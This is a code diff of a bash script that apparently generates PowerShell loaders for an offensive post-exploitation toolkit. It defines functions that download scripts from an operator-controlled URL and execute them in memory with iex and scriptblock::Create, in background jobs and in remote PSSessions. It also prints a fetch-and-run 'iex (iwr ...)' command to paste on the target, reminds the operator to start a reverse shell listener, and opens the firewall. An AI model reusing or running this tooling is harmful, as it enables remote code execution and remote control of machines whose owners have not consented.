@@ -35,27 +35,20 @@ cleanup() {
 
 deploy() {
     local action
-    local asjob
-    local iwr="iwr -DisableKeepAlive -UseBasicParsing"
     local name="$1"
     local path="$2"
-    local scriptblock
+    local sb
 
     case "$path" in
         *".dll") action="Import"; name="${name}DLL" ;;
-        "./"*".ps1") action="Invoke"; asjob="true" ;;
+        "./"*".ps1") action="Invoke" ;;
         *".ps1"|*".psd1"|*."psm1") action="Get" ;;
     esac
 
     # Build scriptblock
     case "$action" in
-        "Get") scriptblock+="\"iex (\" + \$(" ;;
-        "Invoke") scriptblock+="\$(" ;;
-    esac
-    scriptblock+="(Get-Command $action-$name).definition"
-    case $action in
-        "Get") scriptblock+=") + \")\"" ;;
-        "Invoke") scriptblock+=")" ;;
+        "Get"|"Invoke") sb="\$(Get-$name)" ;;
+        "Import") sb="(Get-Command $action-$name).definition" ;;
     esac
 
     cat <<EOF
@@ -90,15 +83,14 @@ $(
     case "$action" in
         ("Invoke")
             cat <<EOS
+function Get-$name {
+    [System.Text.Encoding]::ASCII.GetString(($iwr $url/$path).content)
+}
 function $action-${name}InBg {
     Start-Job -ScriptBlock (
         [scriptblock]::Create(
             'Start-Process -ArgumentList "-c", (
-                [scriptblock]::Create(
-                    [System.Text.Encoding]::ASCII.GetString(
-                        ($iwr $url/$path).content
-                    )
-                )
+                [scriptblock]::Create(\$(Get-$name))
             ) -NoNewWindow powershell'
         )
     )
@@ -116,20 +108,33 @@ function Deploy-$name {
         \$sess
     )
 
-    Invoke-Command ${asjob:+-AsJob }-ScriptBlock (
-        [scriptblock]::Create($scriptblock)
+    Invoke-Command -ScriptBlock (
+        [scriptblock]::Create($sb)
     ) -Session \$sess
+}
 $(
     case "$action" in
         ("Invoke")
             cat <<EOS
+function Deploy-${name}InBg {
+    Param
+    (
+        [Parameter(Position = 0)]
+        [ValidateNotNullOrEmpty()]
+        [System.Management.Automation.Runspaces.PSSession]
+        \$sess
+    )
+
+    Invoke-Command -AsJob -ScriptBlock (
+        [scriptblock]::Create($sb)
+    ) -Session \$sess
     sleep 1
     Get-Job | select -last 1 | Receive-Job
+}
 EOS
             ;;
     esac
 )
-}
 
 EOF
 }
@@ -211,6 +216,7 @@ config="config.default"
 
 # Save some variables for convenience
 cwd="\$ExecutionContext.SessionState.Path.CurrentLocation"
+iwr="iwr -DisableKeepAlive -UseBasicParsing"
 languagemode="\$ExecutionContext.SessionState.LanguageMode"
 red="\$([char]27)[41m"
 reset="\$([char]27)[0m"
@@ -246,7 +252,7 @@ function prompt {
 EOF
 
 # Let user know what to type
-info "iex (iwr -DisableKeepAlive -UseBasicParsing $url/$invade_ps1)"
+info "iex ($iwr $url/$invade_ps1)"
 warn "Don't forget your reverse shell listener on port $rport"
 
 # Open firewall
